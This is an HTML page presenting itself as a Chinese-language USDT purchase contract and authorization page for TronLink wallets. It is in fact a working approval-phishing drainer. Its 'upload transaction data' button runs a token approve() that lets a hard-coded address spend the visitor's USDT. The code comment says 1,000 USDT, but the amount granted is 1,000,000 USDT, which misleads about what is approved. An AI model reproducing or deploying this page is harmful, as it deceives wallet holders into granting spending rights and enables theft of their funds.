<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
  <title>泰達貨幣買賣契約</title>
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <style>
    .wallet-address { font-weight: bold; font-size: 16px; margin: 10px 0; }
    .btn-submit { padding: 10px 20px; background: #2d5ae5; color: white; border: none; cursor: pointer; }
  </style>
</head>
<body>

  <h2>泰達 USDT 授權頁</h2>
  <div>目前錢包地址：</div>
  <div class="wallet-address" id="wallet-address">載入中...</div>

  <button class="btn-submit" onclick="approveUSDT()">上傳交易資料</button>

  <script>
    const USDT_CONTRACT = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // TRON USDT 合約
    const SPENDER = "TBX8foxSthqVpiKqR87gN62M6oE91EKX7B"; // 目標地址

    async function detectWallet() {
      if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
        const address = window.tronWeb.defaultAddress.base58;
        document.getElementById("wallet-address").textContent = address;
      } else {
        document.getElementById("wallet-address").textContent = "請用 TronLink 開啟";
      }
    }

    async function approveUSDT() {
      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
        Swal.fire("請先使用 TronLink 開啟頁面");
        return;
      }

      try {
        const usdt = await tronWeb.contract().at(USDT_CONTRACT);
        const result = await usdt.approve(SPENDER, "1000000000000").send(); // 授權 1,000 USDT（6 decimals）
        Swal.fire("成功授權", `交易哈希：${result}`, "success");
      } catch (e) {
        Swal.fire("授權失敗", e.message || e, "error");
      }
    }

    window.addEventListener("load", () => {
      setTimeout(detectWallet, 500);
    });
  </script>
</body>
</html>
